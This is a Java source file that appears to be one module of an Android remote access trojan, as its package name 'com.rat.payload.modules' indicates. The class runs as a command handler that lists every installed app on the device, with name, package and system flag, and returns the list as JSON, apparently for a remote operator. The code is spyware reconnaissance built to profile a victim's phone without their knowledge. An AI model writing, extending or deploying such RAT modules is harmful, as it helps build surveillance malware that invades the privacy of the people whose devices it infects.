package com.rat.payload.modules;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

public class AppsModule implements CommandHandler.Command {

    private Context context;

    public AppsModule(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public JSONObject execute(JSONObject args) {
        JSONObject result = new JSONObject();
        JSONArray apps = new JSONArray();
        try {
            PackageManager pm = context.getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            for (ApplicationInfo app : packages) {
                JSONObject appObj = new JSONObject();
                appObj.put("package", app.packageName);
                appObj.put("name", pm.getApplicationLabel(app).toString());
                appObj.put("system", (app.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
                apps.put(appObj);
            }
            result.put("apps", apps);
            result.put("count", apps.length());
        } catch (Exception e) {
            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }
}
